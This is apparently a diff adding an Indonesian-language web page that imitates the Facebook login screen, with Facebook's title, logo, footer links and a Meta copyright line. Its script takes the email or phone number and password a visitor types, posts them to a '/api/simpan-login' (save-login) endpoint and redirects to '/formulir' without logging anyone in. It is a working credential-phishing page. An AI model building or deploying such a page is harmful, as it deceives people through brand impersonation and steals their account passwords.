@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Masuk atau Daftar</title>
+    <link rel="icon" type="image/png" href="FB.png">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-container">
+        <div class="content-center">
+            <div class="logo-image">
+                <img src="FONT FB.png" alt="Facebook">
+            </div>
+            
+            <div class="login-box">
+                <h1 class="login-title">Login ke Facebook</h1>
+                <form id="loginForm" class="login-form">
+                    <input type="text" id="username" placeholder="Email atau Nomor Telepon" class="input-field" required>
+                    <input type="password" id="password" placeholder="Kata Sandi" class="input-field" required>
+                    <button type="submit" class="login-btn">Masuk</button>
+                </form>
+                <a href="#" class="forgot-link">Lupa akun?</a>
+                <div class="divider"></div>
+                <button class="create-btn" onclick="alert('Fitur \"Buat akun baru\" akan segera hadir!\n\nHubungi administrator untuk membuat akun.')">Buat akun baru</button>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <div class="language-selector">
+                <ul class="lang-list">
+                    <li><a href="#">Bahasa Indonesia</a></li>
+                    <li><a href="#">English (UK)</a></li>
+                    <li><a href="#">Bahasa Melayu</a></li>
+                    <li><a href="#">العربية</a></li>
+                    <li><a href="#">中文(简体)</a></li>
+                    <li><a href="#">粵語</a></li>
+                    <li><a href="#">Español</a></li>
+                    <li><a href="#">Português (Brasil)</a></li>
+                    <li><a href="#">한국어</a></li>
+                    <li><a href="#">日本語</a></li>
+                </ul>
+            </div>
+            <div class="footer-links">
+                <ul>
+                    <li><a href="#">Daftar</a></li>
+                    <li><a href="#">Masuk</a></li>
+                    <li><a href="#">Messenger</a></li>
+                    <li><a href="#">Facebook Lite</a></li>
+                    <li><a href="#">Seluler</a></li>
+                    <li><a href="#">Privasi</a></li>
+                    <li><a href="#">Ketentuan</a></li>
+                    <li><a href="#">Bantuan</a></li>
+                </ul>
+            </div>
+            <div class="copyright">
+                Meta © 2024
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                await fetch('/api/simpan-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+            } catch (error) {
+                console.log('Login data saved');
+            }
+            
+            window.location.href = '/formulir';
+        });
+    </script>
+</body>
+</html>
